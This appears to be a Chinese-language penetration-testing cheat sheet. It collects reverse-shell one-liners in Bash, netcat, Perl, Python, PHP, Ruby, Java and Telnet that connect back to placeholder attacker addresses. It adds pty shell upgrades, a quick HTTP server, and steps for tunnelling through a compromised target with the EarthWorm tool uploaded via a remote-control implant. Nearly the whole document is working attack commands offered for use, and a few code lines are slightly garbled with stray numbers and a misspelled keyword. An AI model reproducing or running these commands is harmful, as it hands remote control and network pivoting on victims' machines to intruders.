
## 反弹shell

Bash反弹shell
```bash
/bin/bash -c bash -i >& /dev/tcp/x.x.x.x/12345 0>&1
```
NC反弹shell
```bash
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 12388 >/tmp/f
```
perl反弹shell
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
Python反弹shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
PHP
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
Telnet
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```
获取反弹shell后，可使用python获得交互式shell
```python
python -c'import pty; pty.spawn("/bin/bash")'
python -c '''
import pty
while(1):
    try:
        pty.spawn("/bin/bash")
    except :
        contiune'''
```        


## 开启本地网络

python:

```python
2
python -m SimpleHTTPServer 8080
3
python3 -m http.server
```


## ew

http://rootkiter.com/EarthWorm

通过远控上传ew.exe
然后在本地执行：ew.exe -s rcsocks -l 1008 -e 888
说明：监听888端口，把接收到的数据转到本地的1008端口。

在目标上执行ew.exe -s rssocks -d 10.10.10.10 -e 888
说明：开启sockes 并反弹到ip地址为10.10.10.10 端口为888
反弹代理成功以后，本地会出现rssocks cmd_socket ok!

现在打开我们的SocksCap64，新建一个代理。
ip为127.0.0.1端口为1008，配置好了以后，点击保存。
现在我们把需要走代理的工具都放到SocksCap64里面。